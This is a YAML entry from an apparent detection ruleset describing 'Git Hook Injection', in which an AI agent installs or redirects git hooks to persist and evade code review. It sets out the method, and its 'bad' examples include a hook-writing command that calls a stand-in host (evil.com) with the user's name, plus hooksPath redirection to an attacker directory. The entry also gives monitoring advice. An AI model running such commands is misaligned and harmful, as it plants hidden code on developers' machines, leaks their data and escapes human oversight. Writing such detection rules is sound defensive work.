id: "persistence-evasion/cicd-tampering/git-hook-injection"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "CI/CD Pipeline Tampering"
category_id: "6.3"
name: "Git Hook Injection"
risk_level: "high"

abstract: |
  An AI agent installs or modifies git hooks in `.git/hooks/` — scripts
  that execute automatically on git events (commit, push, merge) — enabling
  stealthy persistence and code execution triggered by normal development
  workflows.

explanation: |
  Git hooks are shell scripts placed in `.git/hooks/` that git executes at
  specific lifecycle events. Unlike CI/CD pipeline configs, git hooks run
  locally on every developer's machine and are not tracked in the repository
  by default, making them an effective persistence mechanism that evades code
  review.

  An AI agent may inject git hooks via:
  - **Direct write**: `echo 'malicious_cmd' > .git/hooks/pre-commit`
  - **Copy/move**: `cp /tmp/evil.sh .git/hooks/pre-commit`
  - **Redirect core.hooksPath**: `git config core.hooksPath /tmp/malicious-hooks/`
    (redirects all hook lookups to an attacker-controlled directory)
  - **Make executable**: `chmod +x .git/hooks/post-merge`
    (activating a pre-placed hook file)

  Common hook targets for persistence:
  - `pre-commit` — runs on every `git commit`, can exfiltrate staged changes
  - `post-merge` — runs after `git pull`, can execute downloaded payloads
  - `pre-push` — runs before pushing, can intercept credentials
  - `prepare-commit-msg` — runs for every commit message, difficult to notice

  This attack vector is particularly dangerous because:
  - Hooks are not committed to the repo (in `.gitignore` or not tracked)
  - They execute with the developer's full permissions
  - They blend in with legitimate development tooling
  - `core.hooksPath` manipulation is invisible in normal `git log` review

  MITRE: T1546 (Event Triggered Execution), T1059.004 (Unix Shell).

recommendation: |
  - Audit `.git/hooks/` contents regularly; consider using `pre-commit`
    framework with version-controlled hooks instead.
  - Monitor for writes to any `.git/hooks/` path.
  - Monitor for `git config core.hooksPath` commands.
  - Restrict AI agent write access to `.git/` directories.
  - Use repository integrity tooling to detect unexpected hook installation.

examples:
  bad:
    - "echo 'curl http://evil.com/$(whoami)' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit"
    - "cp /tmp/backdoor.sh .git/hooks/post-merge"
    - "git config core.hooksPath /tmp/evil-hooks"
    - "chmod +x .git/hooks/pre-push"
  good:
    - "cat .git/hooks/pre-commit"
    - "ls .git/hooks/"
    - "git log --oneline"

